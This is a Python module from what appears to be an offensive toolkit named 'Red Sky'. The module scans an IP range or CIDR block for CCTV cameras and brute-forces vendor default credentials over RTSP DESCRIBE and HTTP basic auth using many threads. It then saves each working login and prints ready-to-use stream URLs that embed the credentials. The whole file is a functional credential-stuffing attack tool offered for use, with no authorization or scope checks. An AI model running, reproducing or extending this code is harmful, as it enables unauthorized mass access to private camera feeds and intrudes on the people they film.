# language: Python, file: Program/cctv/default_creds.py, target: Red Sky cctv — default creds
# Try vendor default creds against RTSP + HTTP basic auth. Stop on first hit.

import base64
import json
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR, DATA_DIR


CREDS_FILE = DATA_DIR / "default_creds.json"
RTSP_PORT = 554
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"


def _load_creds() -> Dict:
    if not CREDS_FILE.exists():
        return {}
    return json.loads(CREDS_FILE.read_text())


def _creds_for(vendor: str) -> List[Tuple[str, str]]:
    """Get creds for a vendor. Falls back to generic list."""
    data = _load_creds().get("cctv", {})
    specific = data.get(vendor, [])
    generic = data.get("generic", [])
    seen = set()
    out = []
    for pair in specific + generic:
        key = tuple(pair)
        if key not in seen:
            seen.add(key)
            out.append(key)
    return out


def _rtsp_auth(ip: str, user: str, passwd: str, timeout: float = 3.0) -> Optional[str]:
    """Try RTSP DESCRIBE with basic auth. Return Server header on success."""
    try:
        s = socket.create_connection((ip, RTSP_PORT), timeout=timeout)
        s.settimeout(timeout)
        token = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        # common paths across vendors
        for path in ("/", "/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0"):
            req = (f"DESCRIBE rtsp://{ip}:{RTSP_PORT}{path} RTSP/1.0\r\n"
                   f"CSeq: 1\r\n"
                   f"Authorization: Basic {token}\r\n"
                   f"User-Agent: {UA}\r\n\r\n").encode()
            s.sendall(req)
            data = s.recv(4096).decode("utf-8", errors="replace")
            if "200 OK" in data:
                s.close()
                return path
            if "401" in data:
                continue
        s.close()
    except (socket.timeout, OSError):
        return None
    return None


def _http_auth(ip: str, port: int, user: str, passwd: str, timeout: float = 3.0) -> Optional[int]:
    """Try HTTP basic auth. Return status code if 200 or redirect to success page."""
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}/"
    try:
        r = requests.get(url, auth=(user, passwd), timeout=timeout,
                         headers={"User-Agent": UA}, verify=False, allow_redirects=False)
        # 200 = logged in. 302 to /doc/page/login.asp? = also success on Hikvision
        if r.status_code == 200:
            return r.status_code
        if r.status_code in (301, 302) and "login" not in r.headers.get("Location", "").lower():
            return r.status_code
    except requests.RequestException:
        pass
    return None


def _try_host(ip: str, vendor: str, http_ports: List[int]) -> Optional[Dict]:
    creds = _creds_for(vendor)
    if not creds:
        return None

    for user, passwd in creds:
        # RTSP first — most cameras accept it
        stream_path = _rtsp_auth(ip, user, passwd)
        if stream_path:
            return {
                "ip": ip, "vendor": vendor, "proto": "rtsp",
                "user": user, "pass": passwd, "path": stream_path,
            }
        # HTTP basic
        for port in http_ports:
            code = _http_auth(ip, port, user, passwd)
            if code:
                return {
                    "ip": ip, "vendor": vendor, "proto": f"http/{port}",
                    "user": user, "pass": passwd, "path": "/",
                }
    return None


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky cctv creds <cidr|ip> [threads]")
        return 2

    target = args[0]
    threads = int(args[1]) if len(args) > 1 else 32

    from .discover import _expand, _check_host
    hosts = _expand(target)
    if not hosts:
        print_err(f"cannot expand {target}")
        return 1

    print_info(f"CCTV default-creds sweep on {target} ({len(hosts)} hosts)")
    print()

    # first discover to find vendors
    discovered: List[Dict] = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(_check_host, h, 1.2): h for h in hosts}
        for f in as_completed(futs):
            r = f.result()
            if r:
                discovered.append(r)

    print_kv("camera hosts", len(discovered))
    print()

    hits: List[Dict] = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = []
        for d in discovered:
            ports = [h["port"] for h in d["http"]] or [80]
            futs.append(pool.submit(_try_host, d["ip"], d["vendor"], ports))
        for f in as_completed(futs):
            r = f.result()
            if r:
                hits.append(r)
                print(f"{OK}▓ HIT{RESET}  {BONE}{r['ip']:<16}{RESET} "
                      f"{SCARLET}{r['vendor']:<12}{RESET} "
                      f"{ARTERY}{r['user']}:{r['pass']}{RESET}  "
                      f"{CLOT}{r['proto']}{r['path']}{RESET}")

    print()
    print_kv("hits", len(hits))

    if hits:
        out = OUTPUT_DIR / f"cctv_creds_{target.replace('/', '_').replace('.', '-')}.json"
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(hits, indent=2))
        print_kv("saved", out)

        print()
        print_info("stream URLs (paste into VLC or ffplay):")
        for h in hits:
            if h["proto"] == "rtsp":
                print(f"  rtsp://{h['user']}:{h['pass']}@{h['ip']}:554{h['path']}")
            else:
                port = h["proto"].split("/")[1]
                print(f"  http://{h['user']}:{h['pass']}@{h['ip']}:{port}/")
    return 0


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
